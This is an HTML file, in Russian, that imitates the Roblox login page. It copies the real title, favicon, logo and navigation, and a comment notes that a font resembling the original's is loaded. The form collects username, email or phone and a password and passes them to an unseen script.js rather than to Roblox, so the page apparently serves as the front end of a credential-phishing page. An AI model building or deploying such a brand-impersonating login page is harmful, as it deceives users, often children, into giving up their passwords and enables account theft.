<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox</title>
    <link rel="icon" href="https://www.roblox.com/favicon.ico" type="image/x-icon">
    <!-- Подключаем шрифт, похожий на оригинальный -->
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <div class="bg-image"></div>

    <nav class="navbar">
        <div class="nav-left">
            <a href="#" class="logo">
                <svg viewBox="0 0 24 24" width="24" height="24" fill="#fff">
                    <path d="M5.16 2.5l15.67 2.76a1.4 1.4 0 0 1 1.16 1.6l-2.54 14.43a1.4 1.4 0 0 1-1.6 1.16L2.18 19.7a1.4 1.4 0 0 1-1.16-1.6L3.56 3.66a1.4 1.4 0 0 1 1.6-1.16zm3.03 5.08l-1.48 8.4 8.4 1.48 1.48-8.4-8.4-1.48z"/>
                </svg>
                <span class="logo-text">ROBLOX</span>
            </a>
            <div class="nav-links">
                <a href="#">Диаграммы</a>
                <a href="#">Торговая площадка</a>
                <a href="#">Создавать</a>
                <a href="#">Робукс</a>
            </div>
        </div>
        
        <div class="nav-center">
            <div class="search-bar">
                <svg class="search-icon" viewBox="0 0 24 24" width="16" height="16" fill="#b8b8b8">
                    <path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/>
                </svg>
                <input type="text" placeholder="Поиск">
            </div>
        </div>

        <div class="nav-right">
            <a href="#" class="register-btn">Зарегистрироваться</a>
        </div>
    </nav>

    <div class="login-container">
        <h1>Войти в Roblox</h1>
        
        <form id="loginForm">
            <input type="text" id="username" placeholder="Имя пользователя/Электронная почта/Телефон" required>
            <input type="password" id="password" placeholder="Пароль" required>
            <button type="submit" class="login-btn">Авторизоваться</button>
        </form>

        <div class="forgot-password">
            <a href="#">Забыли пароль или имя пользователя?</a>
        </div>

        <div class="divider"></div>

        <div class="login-options">
            <button class="secondary-btn">Отправить мне одноразовый код по электронной почте</button>
            <button class="secondary-btn">Быстрый вход</button>
            <button class="secondary-btn">Другие варианты входа в систему</button>
        </div>

        <div class="footer-text">
            У вас нет аккаунта? <a href="#">Зарегистрируйтесь</a>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
